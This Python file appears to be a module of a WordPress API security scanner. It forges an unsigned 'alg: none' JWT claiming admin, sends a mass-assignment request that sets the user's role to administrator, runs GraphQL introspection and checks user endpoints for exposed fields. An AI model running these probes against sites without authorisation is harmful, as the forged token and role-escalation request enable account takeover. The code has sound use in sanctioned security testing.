"""
WPHunter - API Security Scanner
===============================
Test for API security vulnerabilities in WordPress REST API and GraphQL.

Tests:
1. JWT vulnerabilities (none algorithm, weak secret)
2. Mass assignment detection
3. API rate limiting bypass
4. GraphQL introspection
5. REST API excessive data exposure
6. API versioning issues

CWE-285: Improper Authorization
CWE-639: Authorization Bypass Through User-Controlled Key
"""

import asyncio
import base64
import json
from dataclasses import dataclass
from typing import Dict, List, Optional

from core.http_client import WPHttpClient
from core.logger import logger
from core.security import get_rate_limiter


@dataclass
class APIFinding:
    """API security finding."""
    vuln_type: str
    url: str
    evidence: str
    severity: str = "high"
    cwe: str = "CWE-285"
    payload: Optional[str] = None
    
    def to_dict(self) -> Dict:
        return {
            "type": "API Security",
            "vuln_type": self.vuln_type,
            "url": self.url,
            "evidence": self.evidence[:300],
            "severity": self.severity
        }


class APISecurityScanner:
    """API security scanner for WordPress."""
    
    def __init__(self, http_client: WPHttpClient):
        self.http = http_client
        self.findings: List[APIFinding] = []
        self.rate_limiter = get_rate_limiter()
    
    async def scan(self) -> List[APIFinding]:
        """Run API security tests."""
        logger.section("API Security Scan")
        
        # 1. JWT vulnerabilities
        await self._test_jwt_vulns()
        
        # 2. Mass assignment
        await self._test_mass_assignment()
        
        # 3. GraphQL introspection
        await self._test_graphql()
        
        # 4. Excessive data exposure
        await self._test_data_exposure()
        
        logger.success(f"API security scan: {len(self.findings)} findings")
        return self.findings
    
    async def _test_jwt_vulns(self):
        """Test JWT vulnerabilities."""
        logger.info("Testing JWT vulnerabilities...")
        
        # Test 1: None algorithm
        fake_token = self._create_jwt_none_alg({"user_id": 1, "username": "admin"})
        
        try:
            response = await self.http.get(
                "/wp-json/wp/v2/users/me",
                headers={"Authorization": f"Bearer {fake_token}"}
            )
            
            if response.ok and response.is_json:
                self.findings.append(APIFinding(
                    vuln_type="jwt_none_algorithm",
                    url="/wp-json/wp/v2/users/me",
                    evidence="JWT accepts 'none' algorithm",
                    severity="critical",
                    cwe="CWE-347",
                    payload=fake_token
                ))
                logger.vuln("critical", "JWT none algorithm accepted")
                
        except Exception:
            pass
    
    async def _test_mass_assignment(self):
        """Test mass assignment vulnerabilities."""
        logger.info("Testing mass assignment...")
        
        # Try to modify role via user update
        try:
            response = await self.http.post(
                "/wp-json/wp/v2/users/me",
                json={
                    "roles": ["administrator"],
                    "capabilities": {"administrator": True}
                }
            )
            
            if response.ok:
                self.findings.append(APIFinding(
                    vuln_type="mass_assignment",
                    url="/wp-json/wp/v2/users/me",
                    evidence="Mass assignment allows role escalation",
                    severity="critical",
                    cwe="CWE-915"
                ))
                logger.vuln("critical", "Mass assignment vulnerability")
                
        except Exception:
            pass
    
    async def _test_graphql(self):
        """Test GraphQL introspection."""
        logger.info("Testing GraphQL...")
        
        introspection_query = {
            "query": """
            {
                __schema {
                    types {
                        name
                        fields {
                            name
                        }
                    }
                }
            }
            """
        }
        
        try:
            response = await self.http.post("/graphql", json=introspection_query)
            
            if response.ok and response.is_json:
                data = response.json()
                if "__schema" in str(data):
                    self.findings.append(APIFinding(
                        vuln_type="graphql_introspection",
                        url="/graphql",
                        evidence="GraphQL introspection enabled",
                        severity="medium",
                        cwe="CWE-200"
                    ))
                    logger.vuln("medium", "GraphQL introspection enabled")
                    
        except Exception:
            pass
    
    async def _test_data_exposure(self):
        """Test excessive data exposure."""
        logger.info("Testing data exposure...")
        
        # Check user endpoint for sensitive data
        try:
            response = await self.http.get("/wp-json/wp/v2/users")
            
            if response.ok and response.is_json:
                users = response.json()
                
                if users and isinstance(users, list):
                    sensitive_fields = ["email", "roles", "capabilities"]
                    exposed = []
                    
                    for field in sensitive_fields:
                        if field in users[0]:
                            exposed.append(field)
                    
                    if exposed:
                        self.findings.append(APIFinding(
                            vuln_type="excessive_data_exposure",
                            url="/wp-json/wp/v2/users",
                            evidence=f"Sensitive data exposed: {', '.join(exposed)}",
                            severity="medium",
                            cwe="CWE-200"
                        ))
                        logger.vuln("medium", f"Data exposure: {exposed}")
                        
        except Exception:
            pass
    
    def _create_jwt_none_alg(self, payload: dict) -> str:
        """Create JWT with algorithm=none."""
        header = {"alg": "none", "typ": "JWT"}
        
        header_b64 = base64.urlsafe_b64encode(
            json.dumps(header).encode()
        ).decode().rstrip("=")
        
        payload_b64 = base64.urlsafe_b64encode(
            json.dumps(payload).encode()
        ).decode().rstrip("=")
        
        return f"{header_b64}.{payload_b64}."
    
    def get_summary(self) -> Dict:
        """Get summary."""
        return {
            "total": len(self.findings),
            "by_type": {
                "jwt": len([f for f in self.findings if "jwt" in f.vuln_type]),
                "mass_assignment": len([f for f in self.findings if f.vuln_type == "mass_assignment"]),
                "graphql": len([f for f in self.findings if "graphql" in f.vuln_type]),
                "data_exposure": len([f for f in self.findings if "exposure" in f.vuln_type]),
            },
            "findings": [f.to_dict() for f in self.findings]
        }
